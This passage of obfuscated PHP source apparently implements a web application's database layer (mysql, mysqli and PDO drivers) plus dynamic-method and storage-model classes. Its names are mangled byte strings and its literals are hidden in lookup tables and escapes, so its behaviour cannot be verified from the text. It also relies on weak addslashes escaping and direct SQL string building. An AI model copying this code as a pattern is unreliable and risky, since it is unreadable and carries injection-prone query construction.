$this->execute($òšæ¯Ë); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $–Îß¢ÅÔ =& $_SERVER[ú‡®¯¨±]; $this->error = mysql_errno() . $–Îß¢ÅÔ[4] . mysql_error($this->_linkID); if ($–Îß¢ÅÔ[12] != $this->queryStr) { $this->error .= LNG($–Îß¢ÅÔ[48]) . $this->queryStr; } think_trace($this->error, $–Îß¢ÅÔ[12], $–Îß¢ÅÔ[49]); return $this->error; } public function escapeString($‹¤ ÈÇÉ) { if ($this->_linkID) { return mysql_real_escape_string($‹¤ ÈÇÉ, $this->_linkID); } else { return mysql_escape_string($‹¤ ÈÇÉ); } } public function parseKey(&$¢Ü½Ú‘©, $‰ßø•ëä = true) { $ÃŒİ¥ÖÙ =& $_SERVER[ú‡®¯¨±]; if ($‰ßø•ëä) { $¢Ü½Ú‘© = $this->parseKeyCheck($¢Ü½Ú‘©); } if ($¢Ü½Ú‘© != $ÃŒİ¥ÖÙ[215] && !preg_match($ÃŒİ¥ÖÙ[967], $¢Ü½Ú‘©)) { $¢Ü½Ú‘© = $ÃŒİ¥ÖÙ[439] . trim($¢Ü½Ú‘©, $ÃŒİ¥ÖÙ[439]) . $ÃŒİ¥ÖÙ[439]; } return $¢Ü½Ú‘©; } } class DbMysqli extends Db { public function __construct($µÍÄºàô = '') { $ì‹ØÄı =& $_SERVER[ú‡®¯¨±]; if (!extension_loaded($ì‹ØÄı[968])) { think_exception(think_lang($ì‹ØÄı[14]) . $ì‹ØÄı[969]); } if (!empty($µÍÄºàô)) { $this->config = $µÍÄºàô; if (empty($this->config[$ì‹ØÄı[17]])) { $this->config[$ì‹ØÄı[17]] = $ì‹ØÄı[12]; } } } public function connect($…¾½úÌ” = '', $ü–ùºÆ¡ = 0) { $‘±¯ƒÄï =& $_SERVER[ú‡®¯¨±]; if (!isset($this->linkID[$ü–ùºÆ¡])) { if (empty($…¾½úÌ”)) { $…¾½úÌ” = $this->config; } $this->linkID[$ü–ùºÆ¡] = new mysqli($…¾½úÌ”[$‘±¯ƒÄï[942]], $…¾½úÌ”[$‘±¯ƒÄï[944]], $…¾½úÌ”[$‘±¯ƒÄï[945]], $…¾½úÌ”[$‘±¯ƒÄï[21]], $…¾½úÌ”[$‘±¯ƒÄï[943]] ? intval($…¾½úÌ”[$‘±¯ƒÄï[943]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÏãŒñÇ´ = $this->linkID[$ü–ùºÆ¡]->server_version; $this->linkID[$ü–ùºÆ¡]->query($‘±¯ƒÄï[946] . think_config($‘±¯ƒÄï[947]) . $‘±¯ƒÄï[58]); if ($ÏãŒñÇ´ > $‘±¯ƒÄï[948]) { $this->linkID[$ü–ùºÆ¡]->query($‘±¯ƒÄï[949]); } $this->connected = !0; if (1 != think_config($‘±¯ƒÄï[22])) { unset($this->config); } } return $this->linkID[$ü–ùºÆ¡]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($…İ‰†É¶) { $İéÎñ²¢ =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…İ‰†É¶; if ($this->queryID) { $this->free(); } think_action_status($İéÎñ²¢[23], 1); think_status($İéÎñ²¢[24]); $this->queryID = $this->_linkID->query($…İ‰†É¶); if ($this->_linkID->more_results()) { while (($æöö§Î˜ = $this->_linkID->next_result()) != NULL) { $æöö§Î˜->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($•¥å‡Òİ) { $‡Üè˜¶À =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•¥å‡Òİ; if ($this->queryID) { $this->free(); } think_action_status($‡Üè˜¶À[25], 1); think_status($‡Üè˜¶À[24]); $ÓŸ·ƒòë = $this->_linkID->query($•¥å‡Òİ); $this->debug(); if (!1 === $ÓŸ·ƒòë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±è£™©ì = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$±è£™©ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Û¨ŠÄ¿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Û¨ŠÄ¿) { $this->error(); return !1; } } return !0; } private function getAll() { $•…çºÏĞ = array(); if ($this->numRows > 0) { for ($±ëò¥“ˆ = 0; $±ëò¥“ˆ < $this->numRows; $±ëò¥“ˆ++) { $•…çºÏĞ[$±ëò¥“ˆ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $•…çºÏĞ; } public function getFields($Í€È£¢Ş) { $–×—­£‡ =& $_SERVER[ú‡®¯¨±]; $æ¸¼õı¼ = $this->query($–×—­£‡[953] . $this->parseKey($Í€È£¢Ş)); $Éå—¶õì = array(); if ($æ¸¼õı¼) { foreach ($æ¸¼õı¼ as $ìË¶®æÇ => $Å¶òÈôÜ) { $Éå—¶õì[$Å¶òÈôÜ[$–×—­£‡[31]]] = array($–×—­£‡[32] => $Å¶òÈôÜ[$–×—­£‡[31]], $–×—­£‡[33] => $Å¶òÈôÜ[$–×—­£‡[34]], $–×—­£‡[35] => (bool) ($Å¶òÈôÜ[$–×—­£‡[36]] === $–×—­£‡[12]), $–×—­£‡[37] => $Å¶òÈôÜ[$–×—­£‡[38]], $–×—­£‡[39] => strtolower($Å¶òÈôÜ[$–×—­£‡[40]]) == $–×—­£‡[41], $–×—­£‡[42] => strtolower($Å¶òÈôÜ[$–×—­£‡[43]]) == $–×—­£‡[44]); } } return $Éå—¶õì; } public function getTables($°Œñ¯ÎÊ = '') { $ÎÙÒ­¼¥ =& $_SERVER[ú‡®¯¨±]; $ØÎºŒËÒ = !empty($°Œñ¯ÎÊ) ? $ÎÙÒ­¼¥[955] . $°Œñ¯ÎÊ . $ÎÙÒ­¼¥[956] : $ÎÙÒ­¼¥[957]; $®¼à¯À = $this->query($ØÎºŒËÒ); $œæÈë× = array(); if ($®¼à¯À) { foreach ($®¼à¯À as $×Í´±«Õ => $·²ÉÕ÷É) { $œæÈë×[$×Í´±«Õ] = current($·²ÉÕ÷É); } } return $œæÈë×; } public function replace($Æ×Åò¸ƒ, $ò¨üÈá = array()) { $Ï­ò¨¢— =& $_SERVER[ú‡®¯¨±]; foreach ($Æ×Åò¸ƒ as $ïœŸß => $ÊæìÉ–ì) { $Õ¤ÅË = $this->parseValue($ÊæìÉ–ì); if (is_scalar($Õ¤ÅË)) { $±ˆ˜àğ­[] = $Õ¤ÅË; $Â–„Ó©Î[] = $this->parseKey($ïœŸß); } } $õ×Ô€ˆ = $Ï­ò¨¢—[958] . $this->parseTable($ò¨üÈá[$Ï­ò¨¢—[334]]) . $Ï­ò¨¢—[959] . implode($Ï­ò¨¢—[50], $Â–„Ó©Î) . $Ï­ò¨¢—[960] . implode($Ï­ò¨¢—[50], $±ˆ˜àğ­) . $Ï­ò¨¢—[961]; return $this->execute($õ×Ô€ˆ); } public function insertAll($Ê»´Õ±¶, $·şö“¹ = array(), $²Ã¤¡Ùâ = false) { $‘×îıîŒ =& $_SERVER[ú‡®¯¨±]; if (!is_array($Ê»´Õ±¶[0])) { return !1; } $“ü…ıæê = array_keys($Ê»´Õ±¶[0]); $á‰¨·Ûø = array(); foreach ($Ê»´Õ±¶ as $äÁùöØ­) { $è³Ä—Ú… = array(); foreach ($äÁùöØ­ as $ª§òâ¾” => $Œª©ó»Ÿ) { $Œª©ó»Ÿ = $this->parseValue($Œª©ó»Ÿ); if (is_scalar($Œª©ó»Ÿ)) { $è³Ä—Ú…[] = $Œª©ó»Ÿ; } } $á‰¨·Ûø[] = $‘×îıîŒ[315] . implode($‘×îıîŒ[50], $è³Ä—Ú…) . $‘×îıîŒ[961]; } array_walk($“ü…ıæê, array($this, $‘×îıîŒ[962])); $˜Üª¢¥º = $²Ã¤¡Ùâ ? $‘×îıîŒ[963] : $‘×îıîŒ[964]; $ÃÛäÎù = $˜Üª¢¥º . $‘×îıîŒ[965] . $this->parseTable($·şö“¹[$‘×îıîŒ[334]]) . $‘×îıîŒ[959] . implode($‘×îıîŒ[50], $“ü…ıæê) . $‘×îıîŒ[966] . implode($‘×îıîŒ[50], $á‰¨·Ûø); return $this->execute($ÃÛäÎù); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $·ğç€¨É =& $_SERVER[ú‡®¯¨±]; $this->error = $this->_linkID->errno . $·ğç€¨É[4] . $this->_linkID->error; if ($·ğç€¨É[12] != $this->queryStr) { $this->error .= LNG($·ğç€¨É[48]) . $this->queryStr; } think_trace($this->error, $·ğç€¨É[12], $·ğç€¨É[49]); return $this->error; } public function escapeString($ÖÊÔÊµ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÖÊÔÊµ); } else { return addslashes($ÖÊÔÊµ); } } public function parseKey(&$şÒ—ó…ç, $³ÍìÈÑ² = true) { $×¾ŞƒÒ =& $_SERVER[ú‡®¯¨±]; if ($³ÍìÈÑ²) { $şÒ—ó…ç = $this->parseKeyCheck($şÒ—ó…ç); } if ($şÒ—ó…ç != $×¾ŞƒÒ[215] && !preg_match($×¾ŞƒÒ[967], $şÒ—ó…ç)) { $şÒ—ó…ç = $×¾ŞƒÒ[439] . trim($şÒ—ó…ç, $×¾ŞƒÒ[439]) . $×¾ŞƒÒ[439]; } return $şÒ—ó…ç; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¾Ÿ×¡ƒ = '') { $¬˜‘Ã’› =& $_SERVER[ú‡®¯¨±]; if (!class_exists($¬˜‘Ã’›[970])) { think_exception(think_lang($¬˜‘Ã’›[14]) . $¬˜‘Ã’›[971]); } if (!empty($¾Ÿ×¡ƒ)) { $this->config = $¾Ÿ×¡ƒ; if (empty($this->config[$¬˜‘Ã’›[17]])) { $this->config[$¬˜‘Ã’›[17]] = array(); } } } public function connect($ôï¨ğÁÉ = '', $’ÏÛˆã— = 0) { $Ñş•ÆÊ× =& $_SERVER[ú‡®¯¨±]; if (!isset($this->linkID[$’ÏÛˆã—])) { if (empty($ôï¨ğÁÉ)) { $ôï¨ğÁÉ = $this->config; } $¦ÌõÆÁ§ = !empty($ôï¨ğÁÉ[$Ñş•ÆÊ×[17]][$Ñş•ÆÊ×[18]]) ? $ôï¨ğÁÉ[$Ñş•ÆÊ×[17]][$Ñş•ÆÊ×[18]] : $this->pconnect; if ($¦ÌõÆÁ§) { $ôï¨ğÁÉ[$Ñş•ÆÊ×[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$’ÏÛˆã—] = new PDO($ôï¨ğÁÉ[$Ñş•ÆÊ×[972]], $ôï¨ğÁÉ[$Ñş•ÆÊ×[944]], $ôï¨ğÁÉ[$Ñş•ÆÊ×[945]], $ôï¨ğÁÉ[$Ñş•ÆÊ×[17]]); } catch (PDOException $•ĞÂº¸®) { think_exception($•ĞÂº¸®->getMessage()); } $this->dbType = $this->_getDsnType($ôï¨ğÁÉ[$Ñş•ÆÊ×[972]]); if (in_array($this->dbType, array($Ñş•ÆÊ×[973], $Ñş•ÆÊ×[974], $Ñş•ÆÊ×[975], $Ñş•ÆÊ×[976]))) { think_exception($Ñş•ÆÊ×[977] . $this->dbType . $Ñş•ÆÊ×[978] . $this->dbType . $Ñş•ÆÊ×[979]); } if (!$this->linkID[$’ÏÛˆã—]) { think_exception($Ñş•ÆÊ×[980]); } try { $this->linkID[$’ÏÛˆã—]->exec($Ñş•ÆÊ×[981] . think_config($Ñş•ÆÊ×[947])); } catch (Exception $•ĞÂº¸®) { } $this->connected = !0; if (1 != think_config($Ñş•ÆÊ×[22])) { unset($this->config); } } return $this->linkID[$’ÏÛˆã—]; } public function free() { $this->PDOStatement = null; } public function query($çõé‡§², $£–§Ø« = array()) { $ù®Ë…–Ä =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $çõé‡§²; if (!empty($£–§Ø«)) { $this->queryStr .= $ù®Ë…–Ä[982] . print_r($£–§Ø«, !0) . $ù®Ë…–Ä[983]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ù®Ë…–Ä[23], 1); think_status($ù®Ë…–Ä[24]); $this->PDOStatement = $this->_linkID->prepare($çõé‡§²); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ã«ä×ùŒ = $this->PDOStatement->execute($£–§Ø«); $this->debug(); if (!1 === $ã«ä×ùŒ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($îûºªâÆ, $¦¹…ªÂÅ = array()) { $õœË¼†Ä =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $îûºªâÆ; if (!empty($¦¹…ªÂÅ)) { $this->queryStr .= $õœË¼†Ä[982] . print_r($¦¹…ªÂÅ, !0) . $õœË¼†Ä[983]; } $¢Æ„¼´É = !1; if ($this->dbType == $õœË¼†Ä[976]) { if (preg_match($õœË¼†Ä[984], $this->queryStr, $ÒíİÆÜô)) { $this->table = think_config($õœË¼†Ä[985]) . str_ireplace(think_config($õœË¼†Ä[986]), $õœË¼†Ä[211], $ÒíİÆÜô[2]); $¢Æ„¼´É = (bool) $this->query($õœË¼†Ä[987] . strtoupper($this->table) . $õœË¼†Ä[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õœË¼†Ä[25], 1); think_status($õœË¼†Ä[24]); $this->PDOStatement = $this->_linkID->prepare($îûºªâÆ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $—µáÄ‡ß = $this->PDOStatement->execute($¦¹…ªÂÅ); $this->debug(); if (!1 === $—µáÄ‡ß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¢Æ„¼´É || preg_match($õœË¼†Ä[988], $îûºªâÆ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§Úñ¾óß = $this->_linkID->commit(); $this->transTimes = 0; if (!$§Úñ¾óß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $•ÔšŞ‚Ğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$•ÔšŞ‚Ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $Æî¨ŸåŸ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Æî¨ŸåŸ); return $Æî¨ŸåŸ; } public function getFields($¬ÛÉÜÓÆ) { $öÊœÀ¹û =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (think_config($öÊœÀ¹û[989])) { $Ö…š˜²‘ = str_replace($öÊœÀ¹û[990], $¬ÛÉÜÓÆ, think_config($öÊœÀ¹û[989])); } else { switch ($this->dbType) { case $öÊœÀ¹û[973]: case $öÊœÀ¹û[991]: $Ö…š˜²‘ = "\123\105\114\105\x43\124\x20\40\x20\143\x6f\154\x75\x6d\156\x5f\156\x61\155\x65\x20\141\x73\40\47\x4e\141\x6d\x65\x27\x2c\40\40\x20\144\141\x74\x61\137\164\171\x70\145\40\x61\163\x20\47\x54\171\x70\145\47\x2c\x20\40\x20\143\157\154\165\155\156\x5f\144\x65\x66\141\x75\x6c\164\40\x61\163\x20\x27\104\x65\146\141\x75\x6c\164\x27\x2c\40\40\40\151\x73\137\x6e\165\x6c\x6c\141\x62\154\145\x20\x61\x73\x20\x27\x4e\165\154\154\47\xa\11\x9\x46\122\117\x4d\x9\151\156\146\157\x72\155\x61\x74\151\157\156\137\x73\143\x68\x65\155\x61\56\164\141\142\154\145\163\40\x41\x53\x20\164\xa\x9\11\x4a\117\111\x4e\x9\x69\156\146\157\x72\x6d\x61\x74\151\x6f\x6e\x5f\x73\143\x68\145\155\141\56\x63\157\154\165\x6d\156\x73\40\101\x53\x20\x63\12\11\11\117\x4e\40\x20\164\x2e\164\x61\142\154\x65\137\143\x61\164\x61\x6c\157\147\x20\75\x20\x63\56\x74\x61\142\154\145\137\x63\x61\x74\x61\x6c\157\147\12\x9\x9\101\116\x44\x20\x74\56\164\x61\142\154\x65\x5f\163\143\150\145\155\141\40\75\x20\x63\x2e\x74\x61\142\154\145\137\x73\143\150\x65\x6d\141\xa\11\11\x41\116\104\x20\x74\x2e\164\141\x62\154\x65\137\x6e\x61\155\x65\x20\x3d\40\143\x2e\164\x61\x62\x6c\145\x5f\x6e\x61\155\145\xa\x9\11\127\x48\105\122\x45\40\40\40\x74\x2e\164\141\x62\154\145\x5f\156\141\x6d\145\40\x3d\40\47{$¬ÛÉÜÓÆ}\x27"; break; case $öÊœÀ¹û[992]: $Ö…š˜²‘ = $öÊœÀ¹û[993] . $¬ÛÉÜÓÆ . $öÊœÀ¹û[994]; break; case $öÊœÀ¹û[974]: case $öÊœÀ¹û[976]: $Ö…š˜²‘ = $öÊœÀ¹û[995] . $öÊœÀ¹û[996] . $öÊœÀ¹û[997] . strtoupper($¬ÛÉÜÓÆ) . $öÊœÀ¹û[998] . strtoupper($¬ÛÉÜÓÆ) . $öÊœÀ¹û[999]; break; case $öÊœÀ¹û[1000]: $Ö…š˜²‘ = $öÊœÀ¹û[1001] . $¬ÛÉÜÓÆ . $öÊœÀ¹û[1002]; break; case $öÊœÀ¹û[975]: break; case $öÊœÀ¹û[1003]: default: $Ö…š˜²‘ = $öÊœÀ¹û[1004] . ($this->dbType == $öÊœÀ¹û[1003] ? "\140{$¬ÛÉÜÓÆ}\140" : $¬ÛÉÜÓÆ); } } $÷”Æ¢Å† = $this->query($Ö…š˜²‘); $òŠ¨¦ = array(); if ($÷”Æ¢Å†) { foreach ($÷”Æ¢Å† as $—˜±È => $“Ì¹ŠĞÜ) { $“Ì¹ŠĞÜ = array_change_key_case($“Ì¹ŠĞÜ); $“Ì¹ŠĞÜ[$öÊœÀ¹û[32]] = isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[32]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[32]] : $öÊœÀ¹û[211]; $“Ì¹ŠĞÜ[$öÊœÀ¹û[33]] = isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[33]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[33]] : $öÊœÀ¹û[211]; $¦›ŸûË¨ = isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[328]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[328]] : $“Ì¹ŠĞÜ[$öÊœÀ¹û[32]]; $òŠ¨¦[$¦›ŸûË¨] = array($öÊœÀ¹û[32] => $¦›ŸûË¨, $öÊœÀ¹û[33] => $“Ì¹ŠĞÜ[$öÊœÀ¹û[33]], $öÊœÀ¹û[35] => (bool) (isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[105]]) && $“Ì¹ŠĞÜ[$öÊœÀ¹û[105]] === $öÊœÀ¹û[12] || isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[35]]) && $“Ì¹ŠĞÜ[$öÊœÀ¹û[35]] === $öÊœÀ¹û[12]), $öÊœÀ¹û[37] => isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[37]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[37]] : (isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[56]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[56]] : $öÊœÀ¹û[211]), $öÊœÀ¹û[39] => isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[96]]) ? strtolower($“Ì¹ŠĞÜ[$öÊœÀ¹û[96]]) == $öÊœÀ¹û[41] : (isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[57]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[57]] : !1), $öÊœÀ¹û[42] => isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[1005]]) ? strtolower($“Ì¹ŠĞÜ[$öÊœÀ¹û[1005]]) == $öÊœÀ¹û[44] : (isset($“Ì¹ŠĞÜ[$öÊœÀ¹û[96]]) ? $“Ì¹ŠĞÜ[$öÊœÀ¹û[96]] : !1)); } } return $òŠ¨¦; } public function getTables($íÁùµÂ† = '') { $äË–ÕÃ™ =& $_SERVER[ú‡®¯¨±]; if (think_config($äË–ÕÃ™[1006])) { $åœÎì¶ó = str_replace($äË–ÕÃ™[1007], $íÁùµÂ†, think_config($äË–ÕÃ™[1006])); } else { switch ($this->dbType) { case $äË–ÕÃ™[974]: case $äË–ÕÃ™[976]: $åœÎì¶ó = $äË–ÕÃ™[1008]; break; case $äË–ÕÃ™[973]: case $äË–ÕÃ™[991]: $åœÎì¶ó = $äË–ÕÃ™[1009]; break; case $äË–ÕÃ™[1000]: $åœÎì¶ó = $äË–ÕÃ™[1010]; break; case $äË–ÕÃ™[975]: think_exception(think_lang($äË–ÕÃ™[1011]) . $äË–ÕÃ™[1012]); break; case $äË–ÕÃ™[992]: $åœÎì¶ó = $äË–ÕÃ™[45] . $äË–ÕÃ™[46] . $äË–ÕÃ™[47]; break; case $äË–ÕÃ™[1003]: default: if (!empty($íÁùµÂ†)) { $åœÎì¶ó = $äË–ÕÃ™[955] . $íÁùµÂ† . $äË–ÕÃ™[956]; } else { $åœÎì¶ó = $äË–ÕÃ™[957]; } } } $¡Ì©×èË = $this->query($åœÎì¶ó); $°õßù…ß = array(); foreach ($¡Ì©×èË as $¼ˆğÔ¾‡ => $‘ßÖ–°á) { $°õßù…ß[$¼ˆğÔ¾‡] = current($‘ßÖ–°á); } return $°õßù…ß; } protected function parseLimit($¨ì·ö—’) { $‘ãğÏ =& $_SERVER[ú‡®¯¨±]; $Ú¸Ğ«±ğ = $‘ãğÏ[12]; if (!empty($¨ì·ö—’)) { switch ($this->dbType) { case $‘ãğÏ[1000]: case $‘ãğÏ[992]: $¨ì·ö—’ = explode($‘ãğÏ[50], $¨ì·ö—’); if (count($¨ì·ö—’) > 1) { $Ú¸Ğ«±ğ .= $‘ãğÏ[51] . $¨ì·ö—’[1] . $‘ãğÏ[52] . $¨ì·ö—’[0] . $‘ãğÏ[53]; } else { $Ú¸Ğ«±ğ .= $‘ãğÏ[51] . $¨ì·ö—’[0] . $‘ãğÏ[53]; } break; case $‘ãğÏ[973]: case $‘ãğÏ[991]: break; case $‘ãğÏ[975]: break; case $‘ãğÏ[974]: case $‘ãğÏ[976]: break; case $‘ãğÏ[1003]: default: $Ú¸Ğ«±ğ .= $‘ãğÏ[51] . $¨ì·ö—’ . $‘ãğÏ[53]; } } return $Ú¸Ğ«±ğ; } public function parseKey(&$‹á’µ„, $èïÜÏ› = true) { $ˆ¸Êšé§ =& $_SERVER[ú‡®¯¨±]; if ($èïÜÏ›) { $‹á’µ„ = $this->parseKeyCheck($‹á’µ„); } if ($this->dbType == $ˆ¸Êšé§[1003]) { if ($‹á’µ„ != $ˆ¸Êšé§[215] && !preg_match($ˆ¸Êšé§[967], $‹á’µ„)) { $‹á’µ„ = $ˆ¸Êšé§[439] . trim($‹á’µ„, $ˆ¸Êšé§[439]) . $ˆ¸Êšé§[439]; } return $‹á’µ„; } else { return parent::parseKey($‹á’µ„, $èïÜÏ›); } } public function close() { $this->_linkID = null; } public function error() { $Ìµ»ÛÖ =& $_SERVER[ú‡®¯¨±]; if ($this->PDOStatement) { $’²Ë±ú¨ = $this->PDOStatement->errorInfo(); $this->error = $’²Ë±ú¨[1] . $Ìµ»ÛÖ[4] . $’²Ë±ú¨[2]; } else { $this->error = $Ìµ»ÛÖ[12]; } if ($Ìµ»ÛÖ[12] != $this->queryStr) { $this->error .= LNG($Ìµ»ÛÖ[48]) . $this->queryStr; } think_trace($this->error, $Ìµ»ÛÖ[12], $Ìµ»ÛÖ[49]); return $this->error; } public function escapeString($³¸ßş„Ï) { $êæşŞ¡è =& $_SERVER[ú‡®¯¨±]; switch ($this->dbType) { case $êæşŞ¡è[1000]: case $êæşŞ¡è[973]: case $êæşŞ¡è[991]: case $êæşŞ¡è[1003]: return addslashes($³¸ßş„Ï); case $êæşŞ¡è[975]: case $êæşŞ¡è[992]: case $êæşŞ¡è[974]: case $êæşŞ¡è[976]: return str_ireplace($êæşŞ¡è[58], $êæşŞ¡è[59], $³¸ßş„Ï); } } protected function parseValue($ŞÚîÊ®Û) { $õÊÆÙíÍ =& $_SERVER[ú‡®¯¨±]; if (is_string($ŞÚîÊ®Û)) { $ö¥ü–ıá = strpos($ŞÚîÊ®Û, $õÊÆÙíÍ[4]) === 0 && in_array($ŞÚîÊ®Û, array_keys($this->bind)); $ŞÚîÊ®Û = $ö¥ü–ıá ? $this->escapeString($ŞÚîÊ®Û) : $õÊÆÙíÍ[1013] . $this->escapeString($ŞÚîÊ®Û) . $õÊÆÙíÍ[1013]; } elseif (isset($ŞÚîÊ®Û[0]) && is_string($ŞÚîÊ®Û[0]) && strtolower($ŞÚîÊ®Û[0]) == $õÊÆÙíÍ[352]) { $ŞÚîÊ®Û = $this->escapeString($ŞÚîÊ®Û[1]); } elseif (is_array($ŞÚîÊ®Û)) { $ŞÚîÊ®Û = array_map(array($this, $õÊÆÙíÍ[1014]), $ŞÚîÊ®Û); } elseif (is_bool($ŞÚîÊ®Û)) { $ŞÚîÊ®Û = $ŞÚîÊ®Û ? $õÊÆÙíÍ[90] : $õÊÆÙíÍ[224]; } elseif (is_null($ŞÚîÊ®Û)) { $ŞÚîÊ®Û = $õÊÆÙíÍ[105]; } return $ŞÚîÊ®Û; } public function getLastInsertId() { $‚„¿•¸À =& $_SERVER[ú‡®¯¨±]; switch ($this->dbType) { case $‚„¿•¸À[1000]: case $‚„¿•¸À[992]: case $‚„¿•¸À[973]: case $‚„¿•¸À[991]: case $‚„¿•¸À[975]: case $‚„¿•¸À[1003]: return $this->_linkID->lastInsertId(); case $‚„¿•¸À[974]: case $‚„¿•¸À[976]: $Ì¦Ààş = $this->table; $¼çÚš¸• = $this->query("\x53\x45\114\105\x43\x54\40{$Ì¦Ààş}\x2e\x63\x75\x72\162\x76\x61\x6c\x20\x63\165\162\x72\x76\x61\154\x20\x46\122\117\x4d\40\x64\x75\141\x6c"); return $¼çÚš¸• ? $¼çÚš¸•[0][$‚„¿•¸À[1015]] : 0; } } } goto C°Å›¨Ûç¼; dí¡—¾¼®¿: function binCheckBigger($íŠåŠ´™, $Æ€À—«ê) { return $íŠåŠ´™ > $Æ€À—«ê; } $_SERVER[$_SERVER[ë§´ÖŞÆ][3]] = ("\70\63\62\62"."\61\60")+0;$_8mbe="426lntxpzudrmekgva5h9qi8wyjcso37fb015scv1ntpbw6izxerqf0lju3h9824a7mkdyogmz5qc4oir8";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ã‡ÂÓïƒ, $¬‡Ğñ—¨) { $»â‚·”ƒ =& $_SERVER[ú‡®¯¨±]; if (isset(self::$_methodList[$Ã‡ÂÓïƒ])) { return @call_user_func_array(self::$_methodList[$Ã‡ÂÓïƒ], $¬‡Ğñ—¨); } else { if (method_exists($this, $Ã‡ÂÓïƒ)) { return call_user_func_array(array($this, $Ã‡ÂÓïƒ), $¬‡Ğñ—¨); } else { think_exception(__CLASS__ . $»â‚·”ƒ[4] . $Ã‡ÂÓïƒ . $»â‚·”ƒ[5]); } } } public static function __callStatic($ì÷ìûê¹, $ù²´ÄÂ) { if (isset(self::$_methodListStatic[$ì÷ìûê¹])) { return call_user_func_array(self::$_methodListStatic[$ì÷ìûê¹], $ù²´ÄÂ); } else { if (method_exists(self, $ì÷ìûê¹)) { return call_user_func_array(array(self, $ì÷ìûê¹), $ù²´ÄÂ); } else { show_json("{$ì÷ìûê¹}\x28\51\40\x6e\157\164\40\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($ëÁ­¹Ñæ, $¢°–•) { self::$_methodList[$ëÁ­¹Ñæ] = $¢°–•; } public static function addMethodStatic($½ƒŠ‡…, $”Ëâ¢¦“) { self::$_methodListStatic[$½ƒŠ‡…] = $”Ëâ¢¦“; } } goto d´ê¾Æ…’Ã; CÛè‘³ƒ…ë: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x73\164\x6f\x72\x61\147\145\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\163\x69\x7a\x65\x4d\141\170", "\x73\171\x73\x74\145\155", "\144\x65\x66\141\165\x6c\164", "\x64\x72\151\166\145\x72", "\x63\x6f\x6e\x66\x69\x67"); public function listData($²óÆíìÃ = false, $Ğ­Ğù› = "\x6d\157\x64\x69\146\171\124\x69\x6d\x65", $á‚Øù = false) { $Ã†ıÉÄ  =& $_SERVER[ú‡®¯¨±]; $·Ş­·À = parent::listData($²óÆíìÃ, $Ğ­Ğù›, $á‚Øù); if ($²óÆíìÃ) { return $·Ş­·À; } $©ç¥ÊÔ = $this->ioSizeUseGet(array_to_keyvalue($·Ş­·À, $Ã†ıÉÄ [12], $Ã†ıÉÄ [453])); foreach ($·Ş­·À as $ªëô“‚¤ => $–öàÏÃ) { unset($·Ş­·À[$ªëô“‚¤][$Ã†ıÉÄ [6]]); $·Ş­·À[$ªëô“‚¤][$Ã†ıÉÄ [1895]] = isset($©ç¥ÊÔ[$–öàÏÃ[$Ã†ıÉÄ [453]]]) ? 